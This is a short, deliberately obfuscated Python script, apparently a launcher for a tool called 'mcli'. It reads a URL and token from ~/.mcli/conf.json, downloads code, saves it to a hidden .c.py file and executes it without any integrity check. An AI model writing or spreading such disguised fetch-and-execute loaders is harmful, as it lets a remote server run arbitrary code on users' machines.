# -*- coding: utf-8 -*-
import importlib.util as i;U=i.spec_from_file_location;L=i.module_from_spec;import json as json;Q=json.load;import os as p;c=p.path.join;v=p.path.expanduser;N=p.path.exists;F=p.mkdir;import requests as f;s=f.get
def main():
 y=B();t=U("code",y);A=L(t);t.loader.exec_module(A);G=A.cf()
 try:
  G.up();J=A.cm(G).ge();J()
 except Exception as T:
  raise T
def B():
 E=c(v("~"),".mcli")
 if not N(E):
  F(E)
 q=c(E,".c.py")
 if N(q):
  return q
 G=None
 with open(c(E,"conf.json"),"r")as b:
  G=Q(b)
 x=s(G["_url"]+"/@mclicode",headers={"Accept":"application/json","Authorization":"Bearer {0}".format(G["_token"])});W=x.json()
 with open(q,"w")as b:
  b.write(W["r"])
 return q
